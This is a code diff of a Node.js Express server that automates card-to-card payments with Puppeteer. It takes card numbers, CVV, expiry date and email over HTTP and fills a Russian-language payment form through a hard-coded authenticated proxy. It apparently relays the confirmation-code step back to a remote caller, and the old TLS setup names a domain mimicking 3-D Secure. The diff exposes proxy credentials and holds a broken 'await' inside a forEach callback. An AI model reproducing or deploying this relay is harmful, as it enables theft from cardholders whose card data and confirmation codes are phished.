@@ -2,15 +2,16 @@ const puppeteer = require('puppeteer');
 const express = require('express');
 const cors = require('cors')
 const bodyParser = require('body-parser')
+const EventEmitter = require('event-emitter')
 
 const https = require("https"),
   fs = require("fs");
 
 
-const options = {
-  key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
-  cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
-};
+// const options = {
+//   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
+//   cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
+// };
 
 const app = express()
 
@@ -19,8 +20,30 @@ app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json())
 app.use(cors())
 
-const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
-    const browser = await puppeteer.launch({headless: false, slowMo: 40, args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
+const html_obj = {}
+
+const write_data = async (inputs, page, browser) => {
+    const input_list = await page.$$('input')
+    input_list.forEach((input, idx) => {
+      await input.type(inputs[idx])
+    })
+    console.log(await page.$$('input'))
+    try { 
+
+      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
+         const isOne = !!(await page.$x('//*[contains(text(), "Платеж проведен")]')).length
+         console.log(isOne)
+         await browser.close()
+         return isOne ? 1 : 0
+      }
+     } catch (e) {
+         await browser.close()
+         return 0
+     }
+     await browser.close()
+}
+const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
+    const browser = await puppeteer.launch({headless: false, args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
     await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
     await page.setViewport({ width: 1920, height: 984 })
@@ -46,19 +69,43 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
 
     if(email) await page.type('.text-input-form-field-input-control-self-336', email)
 
-    await page.waitForTimeout(1500);
-    
+    await page.waitForTimeout(1000);
     await page.click('.submit-button-298')
 
     await page.waitForNavigation({waitUntil: 'networkidle2'});
 
-    return page.url()
+    await page.waitForTimeout(5000);
+
+    return {inputs: await page.$$('input'), page, browser}
 }
 app.post('/sendData', async (req, res) => {
-        const {toCard,amount, fromCard, cvv, expireDate, email} = req.body
-        const url = await write_data(toCard,amount, fromCard, cvv, expireDate, email)
-        return res.redirect(url)
+        const {toCard,amount, fromCard, cvv, expireDate, email, id} = req.body
+        const {inputs, page, browser} = await send_html(toCard,amount, fromCard, cvv, expireDate, email)
+        res.status(200).json({inputs})
+
+        console.log("wait", id)
+        const locker = new EventEmitter();
+  
+        const lockable = async () => {
+          const checker = () => {
+            setTimeout(() => html_obj[id] ? locker.emit('unlocked') : checker(), 1000)
+            if(html_obj[id]) return
+          }
+          await checker()
+          await new Promise(resolve => locker.once('unlocked', resolve));
+          return 
+        }
+        await lockable()
+        console.log('successfully recieved', id)
+
+        await write_data(html_obj[id], page, browser)
+
+})
+app.post('/sendHtml', async (req, res) => {
+  const {html, id} = req.body
+  html_obj[id] = html
+  return res.status(200)
 })
 
-app.listen(80)
-https.createServer(options, app).listen(443);
+app.listen(5000)
+// https.createServer(options, app).listen(443);
